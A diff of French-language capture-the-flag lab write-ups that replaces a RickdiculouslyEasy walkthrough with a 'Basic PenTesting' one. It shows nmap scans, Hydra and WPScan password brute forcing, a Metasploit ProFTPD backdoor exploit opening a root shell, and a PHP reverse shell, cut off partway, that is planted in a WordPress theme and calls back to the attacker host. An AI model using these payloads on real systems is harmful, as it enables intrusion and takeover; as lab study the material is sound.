@@ -1,669 +1,539 @@
-﻿#Analyse RickdicoulsyEasy
+# Analyse Basic PenTesting
 
+## Recherche de la maichine sur le reseau :
 
-#### Recherche de la machine sur le réseau : 
-```bash
-└─$ sudo nmap -sS 10.0.2.15/24    
-Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 10:01 EDT
+```bash 
+└─$ sudo nmap -sS 10.0.2.4/24
+[sudo] password for kali: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-08 08:38 EDT
 Nmap scan report for 10.0.2.1
-Host is up (0.000058s latency).
+Host is up (0.000043s latency).
 Not shown: 999 closed tcp ports (reset)
 PORT   STATE SERVICE
 53/tcp open  domain
 MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
 
 Nmap scan report for 10.0.2.2
-Host is up (0.00012s latency).
+Host is up (0.000079s latency).
 Not shown: 999 closed tcp ports (reset)
 PORT    STATE SERVICE
 631/tcp open  ipp
 MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
 
 Nmap scan report for 10.0.2.3
-Host is up (0.000077s latency).
+Host is up (0.000036s latency).
 All 1000 scanned ports on 10.0.2.3 are in ignored states.
 Not shown: 1000 filtered tcp ports (proto-unreach)
 MAC Address: 08:00:27:3C:A7:51 (Oracle VirtualBox virtual NIC)
 
-Nmap scan report for 10.0.2.4
-Host is up (0.000087s latency).
-Not shown: 996 closed tcp ports (reset)
-PORT     STATE SERVICE
-21/tcp   open  ftp
-22/tcp   open  ssh
-80/tcp   open  http
-9090/tcp open  zeus-admin
-MAC Address: 08:00:27:BF:52:95 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 10.0.2.5
+Host is up (0.000088s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:E9:28:C3 (Oracle VirtualBox virtual NIC)
 
 Nmap scan report for 10.0.2.15
-Host is up (0.0000050s latency).
+Host is up (0.0000030s latency).
 All 1000 scanned ports on 10.0.2.15 are in ignored states.
 Not shown: 1000 closed tcp ports (reset)
 
-Nmap done: 256 IP addresses (5 hosts up) scanned in 2.83 seconds
+Nmap done: 256 IP addresses (5 hosts up) scanned in 4.46 seconds
+
 ```
 
-Le bail DHCP atribuée a la machine est : `10.0.2.4`. 
+Le bail DHCP attribué à la machine est `10.0.2.5`
 
-#### Analyse des port ouvert et des version 
-```bash
-sudo nmap -sS 10.0.2.4 -p- -sV
-```
-
-**[OUTPUT]**
+## Annalyse des ports et versions des services
 
 ```bash
-└─$ sudo nmap -sS 10.0.2.4 -p- -sV
-Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 10:02 EDT
-Nmap scan report for 10.0.2.4
-Host is up (0.00015s latency).
-Not shown: 65528 closed tcp ports (reset)
-PORT      STATE SERVICE VERSION
-21/tcp    open  ftp     vsftpd 3.0.3
-22/tcp    open  ssh?
-80/tcp    open  http    Apache httpd 2.4.27 ((Fedora))
-9090/tcp  open  http    Cockpit web service 161 or earlier
-13337/tcp open  unknown
-22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
-60000/tcp open  unknown
-3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
-==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port22-TCP:V=7.92%I=7%D=6/7%Time=629F5A90%P=x86_64-pc-linux-gnu%r(NULL,
-SF:42,"Welcome\x20to\x20Ubuntu\x2014\.04\.5\x20LTS\x20\(GNU/Linux\x204\.4\
-SF:.0-31-generic\x20x86_64\)\n");
-==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port13337-TCP:V=7.92%I=7%D=6/7%Time=629F5A90%P=x86_64-pc-linux-gnu%r(NU
-SF:LL,29,"FLAG:{TheyFoundMyBackDoorMorty}-10Points\n");
-==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port60000-TCP:V=7.92%I=7%D=6/7%Time=629F5A96%P=x86_64-pc-linux-gnu%r(NU
-SF:LL,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20reverse\x20shell\.\.\
-SF:.\n#\x20")%r(ibm-db2,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20rev
-SF:erse\x20shell\.\.\.\n#\x20");
-MAC Address: 08:00:27:BF:52:95 (Oracle VirtualBox virtual NIC)
+└─$ sudo nmap -sS 10.0.2.5 -p- -sV   
+[sudo] password for kali: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-08 08:40 EDT
+Nmap scan report for 10.0.2.5
+Host is up (0.000088s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD 1.3.3c
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+MAC Address: 08:00:27:E9:28:C3 (Oracle VirtualBox virtual NIC)
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 44.34 seconds
-
+Nmap done: 1 IP address (1 host up) scanned in 8.44 seconds
 ```
+### Ports ouverts
 
-### Ports ouvert :
-
-Les ports ouvert suivants on étés identifiés sur la machine.
-
-|  Numero | Service  | Version  | 
-|---|---|---|
-|  21/tcp | ftp   | vsftpd 3.0.3  | 
-|  80/tcp   | http   | Apache httpd 2.4.27 ((Fedora))  | 
-| 9090/tcp  | http  |  Cockpit web service 161 or earlier  | 
-| 13337/tcp  |  ?  |   |
-| 22222/tcp  |  ssh | OpenSSH 7.5 (protocol 2.0)  | 
-| 60000/tcp  |  ?  |   | 
-
-
-Les fignerPrint des services nous donnent beaucoup d'informations :
-
-- le port 6000 semble être un reverse shell
-- le port 1337 semble être un Flag
-
-```
-└─$ netcat 10.0.2.4 13337   
-FLAG:{TheyFoundMyBackDoorMorty}-10Points
-```
-***
-#### 13337 TCP
-
-Le premier FLAG réside dans le protocole utilisé sur le port 13337.
-
-**Identification du FLAG N°1**
-`FLAG:{TheyFoundMyBackDoorMorty}-10Points` 
+| Port  | Service | Version  | Vulnerable  | 
+|---|---|---|---|
+|  21  | FTP  | ProFTPD 1.3.3  | Oui |
+|  22  | SSH  | OopenSSH 7.2p2  | Oui |
+|  80  | web |Apache 2.4.18  |  Oui | 
 
 
 ***
-#### 80 TCP
-
-On commance rappidement l'analyse par le serveru web sur le port 80.
-
-Une rappide analyse avec DIRB et son dictionaire standard nous donne :
-
-***Mapping de l'arborecance du serveur web***
-```bash
-└─$ dirb http://10.0.2.4
------------------
-DIRB v2.22    
-By The Dark Raver
------------------
-
-START_TIME: Tue Jun  7 10:22:45 2022
-URL_BASE: http://10.0.2.4/
-WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-
------------------
-
-GENERATED WORDS: 4612                                                          
-
----- Scanning URL: http://10.0.2.4/ ----
-+ http://10.0.2.4/cgi-bin/ (CODE:403|SIZE:217)                                                                  
-+ http://10.0.2.4/index.html (CODE:200|SIZE:326)                                                                
-==> DIRECTORY: http://10.0.2.4/passwords/                                                                       
-+ http://10.0.2.4/robots.txt (CODE:200|SIZE:126)                                                                
-                                                                                                                
----- Entering directory: http://10.0.2.4/passwords/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                               
------------------
-END_TIME: Tue Jun  7 10:22:47 2022
-DOWNLOADED: 4612 - FOUND: 3
-```
-
-Les quelques fichiers et le dossier semblent interssants.
-
-Je commance par le fichier Robot.txt:
-
-***Annalyse de `robot.txt`***
-```bash
-└─$ wget http://10.0.2.4/robot.txt 
---2022-06-07 10:38:25--  http://10.0.2.4/robot.txt
-Connecting to 10.0.2.4:80... connected.
-HTTP request sent, awaiting response... 404 Not Found
-2022-06-07 10:38:25 ERROR 404: Not Found.
-
-└─$ file robots.txt               
-robots.txt: ASCII text
-                                                                                                                   
-└─$ cat robots.txt                
-They're Robots Morty! It's ok to shoot them! They're just Robots!
-
-/cgi-bin/root_shell.cgi
-/cgi-bin/tracertool.cgi
-/cgi-bin/*
-                                                                                                                   
-```
-Nous pouvons extraire quelques information sur les fichiers du dossier au quel nous n'avions pas accès.
 
 
-Les fichier dans cgi-sont prometeurs :
+## Analyse des fails
 
-***Annalyse des `.cgi***
-```bash 
-└─$ ls
-robots.txt  root_shell.cgi  tracertool.cgi
-                                                                                                                   
+![](https://imgur.com/HTdCxtW.png) 
 
-└─$ file root_shell.cgi 
-root_shell.cgi: HTML document, ASCII text
-                                                                                                                   
+Il semble qu'une bonne partie des services soient vulnairables, il est possible d'identifier deux axes d'attaques : 
 
-└─$ cat root_shell.cgi 
-<html><head><title>Root Shell
-</title></head>
---UNDER CONSTRUCTION--
-<!--HAAHAHAHAAHHAaAAAGGAgaagAGAGAGG-->
-<!--I'm sorry Morty. It's a bummer.-->
-</html>
-                                                                                                                   
-
-└─$ file tracertool.cgi 
-tracertool.cgi: HTML document, ASCII text
-                                                                                                                   
-
-└─$ cat tracertool.cgi 
-<html><head><title>Super Cool Webpage
-</title></head>
-<b>MORTY'S MACHINE TRACER MACHINE</b>
-<br>Enter an IP address to trace.</br>
-<form action=/cgi-bin/tracertool.cgi
-    method="GET">
-<textarea name="ip" cols=40 rows=4>
-</textarea>
-<input type="submit" value="Trace!">
-</form>
-          
-```
-Le fichier `tracertool.cgi` semble interessant
-
-
-Exploration avec un navigateur WEB 
-
-![](https://image.noelshack.com/fichiers/2022/23/3/1654681073-20220607-164842.png)
-
-Il est fort probable que cette page soient basée sur l'utilisation de la commande `TraceRoute`
-
-
-![](https://image.noelshack.com/fichiers/2022/23/3/1654681073-20220607-165118.png)
-
-La page est vulnerable aux injections de commandes, nous avons accès a l'utilisateur apache. 
-C'est noté dans un coin et je reviendrais dessus.
-
-
-L'annlyse du dossier password donne ce résultat :
-
-![](https://image.noelshack.com/fichiers/2022/23/3/1654681073-20220607-163214.png)
-
-***Récuperation du FLAG***
-```bash
-└─$ wget http://10.0.2.4/passwords/FLAG.txt
---2022-06-07 10:54:44--  http://10.0.2.4/passwords/FLAG.txt
-Connecting to 10.0.2.4:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 44 [text/plain]
-Saving to: ‘FLAG.txt.1’
-
-FLAG.txt.1                   100%[=============================================>]      44  --.-KB/s    in 0s      
-
-2022-06-07 10:54:44 (12.7 MB/s) - ‘FLAG.txt.1’ saved [44/44]
-
-                                                                                                                  
-└─$ file FLAG.txt      
-FLAG.txt: ASCII text
-                                                                                                                   
-
-└─$ cat FLAG.txt      
-FLAG{Yeah d- just don't do it.} - 10 Points
-
-```
-
-**Identification du Flag n°2 :**
-`FLAG{Yeah d- just don't do it.} - 10 Points`
+- L'un est liée à la version de ProFTPd 
+- L'autre est liée a la version de OpenSSH, qui permet une extraction des userName puis une attaque par bruteForce
 
 
 
-***Une rappide analyse de `Password.html`***
-```bash
---2022-06-07 15:18:27--  http://10.0.2.4/passwords/passwords.html
-Connecting to 10.0.2.4:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 352 [text/html]
-Saving to: ‘passwords.html.1’
-
-passwords.html.1             100%[=============================================>]     352  --.-KB/s    in 0s      
-
-2022-06-07 15:18:27 (120 MB/s) - ‘passwords.html.1’ saved [352/352]
-
-                                                                                                                   
-└─$ cat passwords.html
-<!DOCTYPE html>
-<html>
-<head>
-<title>Morty's Website</title>
-<body>Wow Morty real clever. Storing passwords in a file called passwords.html? You've really done it this time Morty. Let me at least hide them.. I'd delete them entirely but I know you'd go bitching to your mom. That's the last thing I need.</body>
-<!--Password: winter-->
-</head>
-</html>
-```
-Nous trouvons le mot de passe `winter`
-***
-
-#### 9090 TCP
-
-
-La page derriere 9090/tcp donne :
-
-![](https://image.noelshack.com/fichiers/2022/23/3/1654681073-20220607-170047.png) 
-
-Cette page donne notre 3eme flag et ne semble pas être plus interessante.
-
-**Identification du 3eme Flag : **
-`FLAG {There is no Zeus, in your face!} - 10 Points`
 
 ***
-#### 6000 TCP
+
+## Analyse du service ProFTPd
 
 ```bash
-└─$ netcat 10.0.2.4 60000
-Welcome to Ricks half baked reverse shell...
-# ls
-FLAG.txt 
-# ls -la
-FLAG.txt 
-# pwd
-/root/blackhole/ 
-# cd ..
-Permission Denied. 
-# whoami
-root 
-# cd /
-Permission Denied. 
-# ^C                                                                                                                
-```
-**Identification du Flag n°4 :**
-`FLAG{Flip the pickle Morty!} - 10 Points`
+msf6 > search OpenSSH
 
-Il semble que l'utilisateur ne puisse pas faire grand chose, je laisse rappidement cette pise de coté.
-***
+Matching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  post/windows/manage/forward_pageant                           normal     No     Forward SSH Agent Requests To Remote Pageant
+   1  post/windows/manage/install_ssh                               normal     No     Install OpenSSH for Windows
+   2  post/multi/gather/ssh_creds                                   normal     No     Multi Gather OpenSSH PKI Credentials Collection
+   3  auxiliary/scanner/ssh/ssh_enumusers                           normal     No     SSH Username Enumeration
+   4  exploit/windows/local/unquoted_service_path  2001-10-25       excellent  Yes    Windows Unquoted Service Path Privilege Escalation
 
 
-#### tracertool.cgi
-L'ensemble des ports on étés explorés, et il ne semble pas y avoir de faille connue et exploitable dans les version des services utilisée. 
+Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/local/unquoted_service_path                                                                                                                 
 
-Je retourne donc sur ma piste laisée de côté, l'injection de commandes.
+msf6 > search ProFTPD 1.3.3c
 
-Après un peu d'exploration, je constate que la commande `cat` a été remplacée.
+Matching Modules
+================
 
-
-Je récupere les utilisateur dans le fichier `/etc/passwd` à l'aide de less.
-Après extarction, il semble qu'il existe 3 login utilisable, RickSanchez, Morty, Summer,
-
-***Extarcation et identification des users***
-```bash
-└─$ cat login | grep -v "nologin"
-root:x:0:0:root:/root:/bin/bash
-sync:x:5:0:sync:/sbin:/bin/sync
-shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
-halt:x:7:0:halt:/sbin:/sbin/halt
-RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
-Morty:x:1001:1001::/home/Morty:/bin/bash
-Summer:x:1002:1002::/home/Summer:/bin/bash
-
-```
-
-Avant de tenter un brutforce complet sur les utilisateurs, nous allons tenter des tester des tous les couples mot de passe / login que nous avons.
-
-J'utilise l'assistant d'Hydra ce qui me coute un essais pour cause de faute de frape
-
-***Utilisation d'hydra sur le l'accès SSH***
-```bash
-└─$ hydra-wizard
-
-Welcome to the Hydra Wizard
-
-Enter the service to attack (eg: ftp, ssh, http-post-form): ssh
-Enter the target to attack (or filename with targets): usable_password.txt
-Enter a username to test or a filename: ^C
-                                                                                                                   
-└─$ hydra-wizard                       
-
-Welcome to the Hydra Wizard
-
-Enter the service to attack (eg: ftp, ssh, http-post-form): ssh
-Enter the target to attack (or filename with targets): 10.0.2.4
-Enter a username to test or a filename: usable_login.txt
-Enter a password to test or a filename: usable_password.txt
-If you want to test for passwords (s)ame as login, (n)ull or (r)everse login, enter these letters without spaces (e.g. "sr") or leave empty otherwise: sr
-Port number (press enter for default): 22222    
-
-The following options are supported by the service module:
-Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-07 16:30:39
-
-Help for module ssh:
-============================================================================
-The Module ssh does not need or support optional parameters
-
-If you want to add module options, enter them here (or leave empty): 
-
-The following command will be executed now:
- hydra -L usable_login.txt -P usable_password.txt -u -e sr -s 22222  10.0.2.4 ssh
-
-Do you want to run the command now? [Y/n] Y
-
-Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-07 16:30:44
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
-[DATA] attacking ssh://10.0.2.4:22222/
-[22222][ssh] host: 10.0.2.4   login: Summer   password: winter
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-07 16:30:47
-                                                  
-```
-
-Nous avons le login / mdp de l'utilisateur `Summer` mot de passe `winter` 
+   #  Name                                    Disclosure Date  Rank       Check  Description
+   -  ----                                    ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/proftpd_133c_backdoor  2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution
 
 
-#### Connextion en SSH au compte de Summer
-Nous allons explorer un peu les limites du compte de summer.
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/proftpd_133c_backdoor
 
-```bash
- ssh Summer@10.0.2.4 -p 22222
+msf6 > use exploit/unix/ftp/proftpd_133c_backdoor 
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > options 
 
-[Summer@localhost ~]$ ls -la
-total 20
-drwx------. 2 Summer Summer  99 Jun  8 03:31 .
-drwxr-xr-x. 5 root   root    52 Aug 18  2017 ..
--rw-------. 1 Summer Summer   1 Sep 15  2017 .bash_history
--rw-r--r--. 1 Summer Summer  18 May 30  2017 .bash_logout
--rw-r--r--. 1 Summer Summer 193 May 30  2017 .bash_profile
--rw-r--r--. 1 Summer Summer 231 May 30  2017 .bashrc
--rw-rw-r--. 1 Summer Summer  48 Aug 22  2017 FLAG.txt
-[Summer@localhost ~]$ file FLAG.txt 
-FLAG.txt: ASCII text
-[Summer@localhost ~]$ cat FLAG.txt 
-                         _
-                        | \
-                        | |
-                        | |
-   |\                   | |
-  /, ~\                / /
- X     `-.....-------./ /
-  ~-. ~  ~              |
-     \             /    |
-      \  /_     ___\   /
-      | /\ ~~~~~   \  |
-      | | \        || |
-      | |\ \       || )
-     (_/ (_/      ((_/
+Module options (exploit/unix/ftp/proftpd_133c_backdoor):
 
-[Summer@localhost ~]$ less FLAG.txt | taill 10
--bash: taill: command not found
-[Summer@localhost ~]$ less FLAG.txt | tail 10
-tail: cannot open '10' for reading: No such file or directory
-[Summer@localhost ~]$ less FLAG.txt | tail -10
-FLAG{Get off the high road Summer!} - 10 Points
-[Summer@localhost ~]$ 
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki
+                                      /Using-Metasploit
+   RPORT   21               yes       The target port (TCP)
 
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set RHOSTS 10.0.2.5
+RHOSTS => 10.0.2.5
+   
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show payloads 
+
+Compatible Payloads
+===================
+
+   #  Name                                        Disclosure Date  Rank    Check  Description
+   -  ----                                        ---------------  ----    -----  -----------
+   0  payload/cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)
+   1  payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
+   2  payload/cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution
+   3  payload/cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)
+   4  payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
+   5  payload/cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)
+   6  payload/cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
+   7  payload/cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
+
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set payload cmd/unix/reverse
+payload => cmd/unix/reverse
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > options
+
+Module options (exploit/unix/ftp/proftpd_133c_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.0.2.5        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT   21               yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set LHOST 10.0.2.15
+LHOST => 10.0.2.15
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > exploit
+
+[*] Started reverse TCP double handler on 10.0.2.15:4444 
+[-] 10.0.2.4:21 - Exploit failed [unreachable]: Rex::HostUnreachable The host (10.0.2.4:21) was unreachable.
+[*] Exploit completed, but no session was created.
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set RHOSTS 10.0.2.5
+RHOSTS => 10.0.2.5
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > exploit
+
+[*] Started reverse TCP double handler on 10.0.2.15:4444 
+[*] 10.0.2.5:21 - Sending Backdoor Command
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo 5lGEicxghImhKsF7;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket A
+[*] A: "5lGEicxghImhKsF7\r\n"
+[*] Matching...
+[*] B is input...
+[*] Command shell session 1 opened (10.0.2.15:4444 -> 10.0.2.5:49544 ) at 2022-06-12 11:36:57 -0400
+
+whoami
+root
+id
+uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
 ```
 
+Nous avons ici déjà un accès root 
 
-**Identification du Flag n°5 **
-`FLAG{Get off the high road Summer!} - 10 Points`
 
-Il me semble avoir vu un serveur ftp, je vais l'expplorer.
+## Analyse du Port 80 
+
+Le port 80, semble contenire, un simple server WEB. 
+Mais Dirb nous permet de détecter une siteWordprepss. 
+Après résolution en local du nom de domaine pour la gestion des ressources de wordPress. 
+
+On arrive sur un blog wordpress, basic.
 
 ```bash
-[Summer@localhost ~]$ cd /var/ftp/
-[Summer@localhost ftp]$ ls -la
-total 8
-drwxr-xr-x.  3 root root   33 Aug 22  2017 .
-drwxr-xr-x. 22 root root 4096 Aug 21  2017 ..
--rw-r--r--.  1 root root   42 Aug 22  2017 FLAG.txt
-drwxr-xr-x.  2 root root    6 Feb 12  2017 pub
-[Summer@localhost ftp]$ 
-```
-Nous avons trouvé un flag de plus et avoir encore une fois affronter ce terible `cat`, nous avons 
+└─$ wpscan --url vtcsec/secret/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin
 
+
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.22
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://vtcsec/secret/ [10.0.2.5]
+[+] Started: Mon Jun 20 05:06:51 2022
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://vtcsec/secret/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://vtcsec/secret/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://vtcsec/secret/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://vtcsec/secret/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.9.20 identified (Latest, released on 2022-03-11).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://vtcsec/secret/index.php/feed/, <generator>https://wordpress.org/?v=4.9.20</generator>
+ |  - http://vtcsec/secret/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.9.20</generator>
+
+[+] WordPress theme in use: twentyseventeen
+ | Location: http://vtcsec/secret/wp-content/themes/twentyseventeen/
+ | Last Updated: 2022-05-24T00:00:00.000Z
+ | Readme: http://vtcsec/secret/wp-content/themes/twentyseventeen/README.txt
+ | [!] The version is out of date, the latest version is 3.0
+ | Style URL: http://vtcsec/secret/wp-content/themes/twentyseventeen/style.css?ver=4.9.20
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.4 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://vtcsec/secret/wp-content/themes/twentyseventeen/style.css?ver=4.9.20, Match: 'Version: 1.4'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:00 <====================================> (137 / 137) 100.00% Time: 00:00:00
+
+[i] No Config Backups Found.
+
+[+] Performing password attack on Wp Login against 1 user/s
+[SUCCESS] - admin / admin                                                                                          
+Trying admin / admin Time: 00:05:21 <                                    > (19820 / 14364212)  0.13%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: admin, Password: admin
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Mon Jun 20 05:12:23 2022
+[+] Requests Done: 19961
+[+] Cached Requests: 37
+[+] Data Sent: 10.042 MB
+[+] Data Received: 70.163 MB
+[+] Memory used: 284.465 MB
+[+] Elapsed time: 00:05:31
+
+```
+
+Après annalyse nous obtenons le couple `admin/admin`
+
+Comme je n'ai pas envie d'utiliser metasploit 2 fois je vais tenter une technique plus "manuelle", en réalisant une injection au travers des thèmes wordpress, 
+
+Grace au login admin, dans le theme wordpress nous allons glisser un reverseShell. 
+
+Le reverse shell est dans la page Archive
+
+![](https://imgur.com/v6dyvEj.png) 
+
+
+```PHP
+<?php
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.0.2.15';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/bash -i';
+$daemon = 0;
+$debug = 0;
+
+//
+// Daemonise ourself if possible to avoid zombies later
+//
+
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
+if (function_exists('pcntl_fork')) {
+        // Fork and have the parent process exit
+        $pid = pcntl_fork();
+
+        if ($pid == -1) {
+                printit("ERROR: Can't fork");
+                exit(1);
+        }
+
+        if ($pid) {
+                exit(0);  // Parent exits
+        }
+
+        // Make the current process a session leader
+        // Will only succeed if we forked
+        if (posix_setsid() == -1) {
+                printit("Error: Can't setsid()");
+                exit(1);
+        }
+
+        $daemon = 1;
+} else {
+        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+// Change to a safe directory
+chdir("/");
+
+// Remove any umask we inherited
+umask(0);
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+        printit("$errstr ($errno)");
+        exit(1);
+}
+
+// Spawn shell process
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+        printit("ERROR: Can't spawn shell");
+        exit(1);
+}
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won't
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+        // Check for end of TCP connection
+        if (feof($sock)) {
+                printit("ERROR: Shell connection terminated");
+                break;
+        }
+
+        // Check for end of STDOUT
+        if (feof($pipes[1])) {
